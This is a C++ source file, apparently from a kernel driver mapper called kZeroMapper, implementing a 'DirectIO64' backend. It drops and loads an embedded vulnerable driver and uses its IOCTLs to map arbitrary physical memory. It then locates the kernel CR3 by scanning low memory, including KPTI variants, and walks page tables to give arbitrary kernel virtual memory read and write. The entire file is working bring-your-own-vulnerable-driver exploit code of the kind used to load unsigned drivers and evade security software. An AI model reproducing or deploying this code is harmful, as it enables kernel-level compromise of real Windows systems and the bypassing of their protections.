#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_DIRECTIO64)

#include "DirectIO64Backend.h"
#include "../Common/vDriverLoader.h"
#include "directio64_sys.h"
#include "halamd64.h"
#include <algorithm>
#include <vector>

std::string DirectIO64Backend::Name( ) const
{
	return pstra( "DirectIO64" );
}

NTSTATUS DirectIO64Backend::Load( )
{
	m_CallGate = KernelCallGate::NtQueryAtom;

	return KernelRwCallBackend::Load( );
}

NTSTATUS DirectIO64Backend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( directio64_sys, sizeof( directio64_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\DIRECTIOLPT" ),
		image.data( ), image.size( ), &m_Device, 0x9160, pstra( "DIRECTIOLPT" ) );
}

NTSTATUS DirectIO64Backend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( pstra( "DIRECTIOLPT" ) );
}

bool DirectIO64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, buffer, size, false );

	if ( !result )
		LOG_SEC( "[-] - [DirectIO64] ReadMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool DirectIO64Backend::WriteMemory( uint64_t address, const void* buffer, size_t size )
{
	const auto result = ReadWriteVirtual( address, const_cast<void*>( buffer ), size, true );

	if ( !result )
		LOG_SEC( "[-] - [DirectIO64] WriteMemory failed va=0x%llx size=0x%llx gle=%lu", address, size, GetLastError( ) );

	return result;
}

bool DirectIO64Backend::CallDriver( ULONG ioControlCode, PVOID inputBuffer, ULONG inputLength, PVOID outputBuffer, ULONG outputLength )
{
	IO_STATUS_BLOCK ioStatus {};

	auto status = NtDeviceIoControlFile( m_Device, nullptr, nullptr, nullptr, &ioStatus, ioControlCode,
		inputBuffer, inputLength, outputBuffer, outputLength );

	if ( status == STATUS_PENDING )
		status = NtWaitForSingleObject( m_Device, FALSE, nullptr );

	SetLastError( RtlNtStatusToDosError( status ) );

	return NT_SUCCESS( status );
}

PVOID DirectIO64Backend::MapPhysicalMemory( uint64_t physicalAddress, ULONG bytes, HANDLE* sectionHandle, PVOID* allocatedMdl, BOOLEAN writable )
{
	PhysicalMemoryInfo request {};

	*sectionHandle = nullptr;
	*allocatedMdl = nullptr;

	const auto offset = physicalAddress & 0xFFFFFFFFFFFFF000;
	const auto mapSize = s_cast<ULONG>( physicalAddress - offset ) + bytes;

	request.ViewSize = mapSize;
	request.Offset.QuadPart = offset;
	request.Writeable = writable;

	if ( CallDriver( 0x80112044, &request, sizeof( request ), &request, sizeof( request ) ) )
	{
		*sectionHandle = request.SectionHandle;
		*allocatedMdl = request.AllocatedMdl;
		return request.BaseAddress;
	}

	return nullptr;
}

void DirectIO64Backend::UnmapPhysicalMemory( PVOID sectionToUnmap, HANDLE sectionHandle, PVOID allocatedMdl )
{
	PhysicalMemoryInfo request {};

	request.BaseAddress = sectionToUnmap;
	request.AllocatedMdl = allocatedMdl;
	request.SectionHandle = sectionHandle;

	CallDriver( 0x80112048, &request, sizeof( request ), &request, sizeof( request ) );
}

bool DirectIO64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, ULONG bytes, bool write )
{
	PVOID allocatedMdl = nullptr;
	HANDLE sectionHandle = nullptr;

	constexpr uint64_t maxValidPa = 0x10000000000ull;

	if ( physicalAddress >= maxValidPa )
		return false;

	auto mappedSection = MapPhysicalMemory( physicalAddress, bytes, &sectionHandle, &allocatedMdl, write ? TRUE : FALSE );

	if ( !mappedSection )
	{
		if ( !m_QuietMode )
			LOG_SEC( "[-] - [DirectIO64] ReadWritePhysical map failed pa=0x%llx size=0x%X write=%d gle=%lu", physicalAddress, bytes, write ? 1 : 0, GetLastError( ) );
		return false;
	}

	const auto offset = physicalAddress - ( physicalAddress & 0xFFFFFFFFFFFFF000 );
	bool result = false;

	__try
	{
		if ( write )
			RtlCopyMemory( RtlOffsetToPointer( mappedSection, offset ), buffer, bytes );
		else
			RtlCopyMemory( buffer, RtlOffsetToPointer( mappedSection, offset ), bytes );

		result = true;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		LOG_SEC( "[-] - [DirectIO64] ReadWritePhysical exception pa=0x%llx size=0x%X write=%d code=0x%X", physicalAddress, bytes, write ? 1 : 0, GetExceptionCode( ) );
		result = false;
	}

	UnmapPhysicalMemory( mappedSection, sectionHandle, allocatedMdl );

	return result;
}

namespace
{
	ULONG GetProcessorStartBlockCr3Offset( )
	{
		return FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
			FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
	}

	ULONG ScanLowStubForPml4( const uint8_t* data, ULONG size )
	{
		const auto cr3Offset = GetProcessorStartBlockCr3Offset( );
		const auto lmTargetOffset = FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget );
		constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
		constexpr uint64_t maxPhysAddr = 0x10000000000ull;

		for ( ULONG i = 0; i < size; i += 0x1000 )
		{
			__try
			{
				const auto ptr = r_cast<uintptr_t>( data + i );

				if ( ptr + cr3Offset + 8 > r_cast<uintptr_t>( data ) + size )
					break;

				const auto cr3 = *r_cast<const uint64_t*>( ptr + cr3Offset );

				if ( cr3 == 0 || cr3 == 0xFFFFFFFFFFFFFFFFull )
					continue;

				if ( ( cr3 >> 52 ) != 0 )
					continue;

				const auto cr3Page = cr3 & PhysicalAddressMask;
				if ( !cr3Page || cr3Page >= maxPhysAddr )
					continue;

				if ( lmTargetOffset + 8 > 0x1000 )
					continue;

				const auto lmTarget = *r_cast<const uint64_t*>( ptr + lmTargetOffset );

				if ( ( lmTarget & 0xfffff80000000000ull ) != 0xfffff80000000000ull )
					continue;

				return i;
			}
			__except ( EXCEPTION_EXECUTE_HANDLER )
			{
				continue;
			}
		}

		return 0xFFFFFFFF;
	}

	struct QuietGuardDirectIO
	{
		bool& m_Flag;
		explicit QuietGuardDirectIO( bool& flag ) : m_Flag( flag ) { m_Flag = true; }
		~QuietGuardDirectIO( ) { m_Flag = false; }
	};

	bool SafeMemcpyDirectIO( void* dst, const void* src, size_t size )
	{
		__try
		{
			memcpy( dst, src, size );
			return true;
		}
		__except ( EXCEPTION_EXECUTE_HANDLER )
		{
			return false;
		}
	}
}

bool DirectIO64Backend::ValidateCr3WithNtoskrnl( uint64_t cr3 )
{
	if ( !m_Ntoskrnl )
		return false;

	uint64_t testPa = 0;
	if ( !VirtualToPhysicalWithCr3( cr3, m_Ntoskrnl, &testPa ) )
		return false;

	if ( testPa == 0 || testPa >= 0x10000000000ull )
		return false;

	uint16_t mz = 0;
	if ( !ReadWritePhysical( testPa, &mz, sizeof( mz ), false ) )
		return false;

	return mz == 0x5A4D;
}

bool DirectIO64Backend::QueryPml4( uint64_t* value )
{
	if ( !value )
		return false;

	if ( m_Pml4Cache )
	{
		*value = m_Pml4Cache;
		return true;
	}

	*value = 0;

	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
	const auto cr3Offset = FIELD_OFFSET( PROCESSOR_START_BLOCK, ProcessorState ) +
		FIELD_OFFSET( KSPECIAL_REGISTERS, Cr3 );
	const auto lmTargetOffset = FIELD_OFFSET( PROCESSOR_START_BLOCK, LmTarget );

	constexpr ULONG mapSize = 0x1000000;
	constexpr ULONG chunkSize = 0x100000;
	std::vector<uint8_t> lowMemory( mapSize );

	bool readOk = true;

	for ( ULONG chunkOffset = 0; chunkOffset < mapSize && readOk; chunkOffset += chunkSize )
	{
		PVOID allocatedMdl = nullptr;
		HANDLE sectionHandle = nullptr;

		auto mapped = MapPhysicalMemory( chunkOffset, chunkSize, &sectionHandle, &allocatedMdl, FALSE );

		if ( !mapped )
		{
			LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to map low chunk pa=0x%llx gle=%lu", chunkOffset, GetLastError( ) );
			readOk = false;
			break;
		}

		if ( !SafeMemcpyDirectIO( lowMemory.data( ) + chunkOffset, mapped, chunkSize ) )
		{
			LOG_SEC( "[-] - [DirectIO64] QueryPml4 exception reading chunk pa=0x%llx", chunkOffset );
			readOk = false;
		}

		UnmapPhysicalMemory( mapped, sectionHandle, allocatedMdl );
	}

	if ( !readOk )
		return false;

	const auto stubOffset = ScanLowStubForPml4( lowMemory.data( ), mapSize );

	if ( stubOffset != 0xFFFFFFFF )
	{
		const auto rawCr3 = *r_cast<const uint64_t*>( lowMemory.data( ) + stubOffset + cr3Offset );

		if ( ValidateCr3WithNtoskrnl( rawCr3 ) )
		{
			m_Pml4Cache = rawCr3;
			*value = rawCr3;
			LOG_SEC( "[*] - [DirectIO64] QueryPml4 validated pml4=0x%llx", *value );
			return true;
		}

		const auto cr3Pa = rawCr3 & PhysicalAddressMask;
		const auto pcid = rawCr3 & 0xFFFull;

		const uint64_t kptiCandidates[ 5 ] = {
			( cr3Pa + 0x1000 ) | pcid,
			( cr3Pa + 0x1000 ),
			( cr3Pa - 0x1000 ) | pcid,
			( cr3Pa - 0x1000 ),
			( cr3Pa + 0x1000 ) | ( pcid ^ 0x1000 ),
		};

		for ( int i = 0; i < 5; ++i )
		{
			if ( kptiCandidates[ i ] == rawCr3 )
				continue;

			if ( ValidateCr3WithNtoskrnl( kptiCandidates[ i ] ) )
			{
				m_Pml4Cache = kptiCandidates[ i ];
				*value = kptiCandidates[ i ];
				LOG_SEC( "[*] - [DirectIO64] QueryPml4 KPTI kernel cr3=0x%llx (variant %d, user=0x%llx)",
					*value, i, rawCr3 );
				return true;
			}
		}

		LOG_SEC( "[-] - [DirectIO64] Low stub CR3 and KPTI variants all failed validation", 0 );
	}

	LOG_SEC( "[*] - [DirectIO64] Scanning low 16MB for CR3 candidates", 0 );

	if ( !m_Ntoskrnl )
	{
		LOG_SEC( "[-] - [DirectIO64] No validation VA (ntoskrnl=0)", 0 );
		return false;
	}

	const auto p = r_cast<const uint64_t*>( lowMemory.data( ) );
	const size_t qwordCount = mapSize / sizeof( uint64_t );

	ULONG tested = 0;
	{
		QuietGuardDirectIO guard( m_QuietMode );

		for ( size_t i = 0; i < qwordCount; ++i )
		{
			const auto candidate = p[ i ];

			if ( candidate == 0 || candidate == 0xFFFFFFFFFFFFFFFFull )
				continue;

			if ( ( candidate >> 52 ) != 0 )
				continue;

			const auto candidatePa = candidate & PhysicalAddressMask;
			if ( !candidatePa || candidatePa >= 0x10000000000ull )
				continue;

			if ( candidatePa < 0x1000 )
				continue;

			if ( !ValidateCr3WithNtoskrnl( candidate ) )
				continue;

			++tested;

			m_Pml4Cache = candidate;
			*value = candidate;
			LOG_SEC( "[*] - [DirectIO64] QueryPml4 found pml4=0x%llx at offset=0x%llx (tested=%lu)",
				*value, i * 8, tested );
			return true;
		}
	}

	LOG_SEC( "[-] - [DirectIO64] QueryPml4 failed to find PML4 (tested=%lu candidates)", tested );
	return false;
}

bool DirectIO64Backend::PageEntryToPhysicalAddress( uint64_t entry, uint64_t* physicalAddress )
{
	constexpr uint64_t EntryPresentBit = 1;
	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;

	if ( entry & EntryPresentBit )
	{
		*physicalAddress = entry & PhysicalAddressMask;
		return true;
	}

	return false;
}

bool DirectIO64Backend::VirtualToPhysicalWithCr3( uint64_t cr3, uint64_t virtualAddress, uint64_t* physicalAddress )
{
	if ( !physicalAddress )
		return false;

	*physicalAddress = 0;

	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
	constexpr uint64_t PhysicalAddressMask2MbPages = 0x000fffffffe00000ull;
	constexpr uint64_t PhysicalAddressMask1GbPages = 0x000fffffc0000000ull;
	constexpr uint64_t VirtualAddressMask2MbPages = 0x00000000001fffffull;
	constexpr uint64_t VirtualAddressMask1GbPages = 0x000000003fffffffull;
	constexpr uint64_t VirtualAddressMask4KbPages = 0x0000000000000fffull;
	constexpr uint64_t EntryPageSizeBit = 0x0000000000000080ull;

	auto table = cr3 & PhysicalAddressMask;
	uint64_t entry = 0;

	for ( int r = 0; r < 4; r++ )
	{
		const auto shift = 39 - ( r * 9 );
		const auto selector = ( virtualAddress >> shift ) & 0x1ff;

		if ( !ReadWritePhysical( table + selector * sizeof( uint64_t ), &entry, sizeof( entry ), false ) )
			return false;

		if ( !PageEntryToPhysicalAddress( entry, &table ) )
			return false;

		if ( r == 1 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask1GbPages;
			table += virtualAddress & VirtualAddressMask1GbPages;
			*physicalAddress = table;
			return true;
		}

		if ( r == 2 && ( entry & EntryPageSizeBit ) )
		{
			table &= PhysicalAddressMask2MbPages;
			table += virtualAddress & VirtualAddressMask2MbPages;
			*physicalAddress = table;
			return true;
		}
	}

	table += virtualAddress & VirtualAddressMask4KbPages;
	*physicalAddress = table;
	return true;
}

bool DirectIO64Backend::VirtualToPhysical( uint64_t virtualAddress, uint64_t* physicalAddress )
{
	uint64_t pml4 = 0;

	if ( !QueryPml4( &pml4 ) )
	{
		LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed QueryPml4 va=0x%llx", virtualAddress );
		return false;
	}

	if ( !VirtualToPhysicalWithCr3( pml4, virtualAddress, physicalAddress ) )
	{
		LOG_SEC( "[-] - [DirectIO64] VirtualToPhysical failed table walk va=0x%llx pml4=0x%llx", virtualAddress, pml4 );
		return false;
	}

	return true;
}

bool DirectIO64Backend::ReadWriteVirtual( uint64_t address, void* buffer, size_t size, bool write )
{
	auto bytes = r_cast<uint8_t*>( buffer );
	size_t offset = 0;

	while ( offset < size )
	{
		uint64_t physical = 0;
		const auto currentAddress = address + offset;
		const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
		const auto chunk = s_cast<ULONG>( std::min<size_t>( pageLeft, size - offset ) );

		if ( !VirtualToPhysical( currentAddress, &physical ) )
			return false;

		if ( !ReadWritePhysical( physical, bytes + offset, chunk, write ) )
			return false;

		offset += chunk;
	}

	return true;
}




#endif // KZEROMAPPER_ENABLE_DIRECTIO64
